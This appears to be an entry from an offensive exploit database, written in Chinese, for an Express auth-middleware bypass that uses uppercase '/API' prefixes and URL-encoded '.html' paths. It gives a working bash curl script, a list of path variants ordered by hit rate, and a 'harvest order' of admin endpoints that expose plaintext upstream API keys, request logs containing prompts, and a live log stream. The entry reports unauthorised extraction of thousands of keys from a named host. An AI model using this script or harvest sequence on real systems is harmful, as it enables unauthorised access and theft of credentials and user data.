# Express 鉴权中间件路径判定绕过（大小写前缀 /API + URL 编码 .html），配套变体清单与只读收割顺序

- **code**: express-鉴权中间件路径判定绕过-大小写前缀-api-url-编码-.html-配套变体清单与只读收割顺序
- **kind**: script
- **category**: auth-bypass
- **component**: Express（自研 AI API 中转平台管理面板）
- **severity**: critical
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.118:13030（LLM 管理中心）实测：/api/admin/channel-types → 401，/API/admin/channel-types → 200 返回真实渠道类型数据；/admin.html → 302 Location: /login.html?to=%2Fadmin.html，/admin%2Ehtml → 200（15451B 完整管理前端）。13050、13070 同样成立。据此未授权读到 105 渠道 / 3466 唯一上游密钥 / 10144 条生成记录 / 104388 条请求日志。反例（不适用）：203.0.113.118:11600/11620/11630，15 种变体全部失败。
- **path**: pocs/express-鉴权中间件路径判定绕过-大小写前缀-api-url-编码-.html-配套变体清单与只读收割顺序/express_auth_bypass.sh
- **tags**: express,鉴权绕过,路径判定,大小写,url编码,信息泄露
- **created_at**: 2026-09-27T19:45:29.868Z
- **found_by**: exploit

## 描述

Express 应用若把鉴权写在全局/挂载中间件里并用 req.path 做前缀或精确比较，而比较方式大小写敏感或不做 URL 解码，则可用 /API（大写）、/Admin%2Ehtml（编码点）等变体绕过中间件、仍然命中后端路由。本清单按命中率排序给出变体组合与命中后的只读收割顺序。

## 用法

```
T=http://203.0.113.118:13030 bash express_auth_bypass.sh

判定要点：
1) 先给一个已知需要鉴权的接口（如 /api/admin/channel-types），确认它返回 401/302；
2) 再打 /API/admin/channel-types，若返回 200 且为真实数据 —— 绕过成立；
3) 页面类同理：/admin.html 若 302 到 login，试 /admin%2Ehtml /admin%2ehtml /admin.htm%6c；
4) 命中后立即读前端 JS（/assets/*.js）提取完整端点清单再穷举，不要盲猜路径；
5) 反例记录：同一运营方的另一套 Express 应用（11600/11620/11630）用 app.use('/api', mw) 挂载式中间件，
   /API、/Api、/api%2F、//API、/API. 等 15 种变体全部失败（401/404）—— 挂载式中间件大小写不敏感，
   此手法不适用，不要重复投入。
必带 --noproxy "*"（本机若有 HTTP 代理会污染结论）。
```

## 正文

```
#!/usr/bin/env bash
# Express 鉴权中间件「路径判定」绕过验证脚本（只读，不改动目标）
# 原理：中间件用未解码 / 大小写敏感的 req.path 做前缀或精确匹配判定鉴权，
#       而 Express 路由默认 caseSensitive:false，且路由匹配前会 URL 解码
#       -> 变体路径绕过中间件，仍命中真实路由。
# 用法：T=http://host:port bash express_auth_bypass.sh

T="${T:?set T=http://host:port}"
U='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.52 Safari/537.36'

echo "== 1. 基线（应被拦截/重定向）=="
curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  /api/admin/channel-types -> %{http_code}\n" "$T/api/admin/channel-types"
curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  /admin.html              -> %{http_code}\n" "$T/admin.html"

echo "== 2. 大小写变体前缀（命中率最高）=="
for p in /API /Api /aPI /aPi; do
  curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  $p/admin/channel-types -> %{http_code}\n" "$T$p/admin/channel-types"
done

echo "== 3. 静态页 URL 编码变体（取被中间件保护的页面）=="
for p in "/admin%2Ehtml" "/admin%2ehtml" "/admin.htm%6c" "/admin%2Ecss"; do
  curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  $p -> %{http_code} (%{size_download}B)\n" "$T$p"
done

echo "== 4. 其它常见变体（多为 404，Express 不把 %2F 当分隔符）=="
for p in "/api%2Fadmin" "//api/admin" "/api./admin" "/api/admin%2F" "/%61pi/admin" "/api/admin;x" "/api/admin/"; do
  curl -sk --noproxy "*" -A "$U" -o /dev/null -w "  $p -> %{http_code}\n" "$T$p"
done

echo "== 5. 命中后的收割顺序（全部 GET 只读）=="
# 先读前端拿端点清单，再逐个打 —— 比盲枚举准确得多
# /admin%2Ehtml                          -> 管理页 HTML（含 <script src=/assets/...>）
# /assets/admin-common.js                -> 完整 API 清单
# /assets/pages/*.js                     -> 各页面调用的接口
# /API/admin/channel-types               -> 渠道类型定义
# /API/admin/channels                    -> 渠道 + 上游 api_keys 明文
# /API/admin/stats                       -> 渠道调用统计
# /API/admin/settings                    -> 系统配置
# /API/admin/request-logs                -> 请求日志（含 prompt）
# /API/admin/generations                 -> 生成记录
# /API/logs/stream                       -> SSE 实时日志流

```
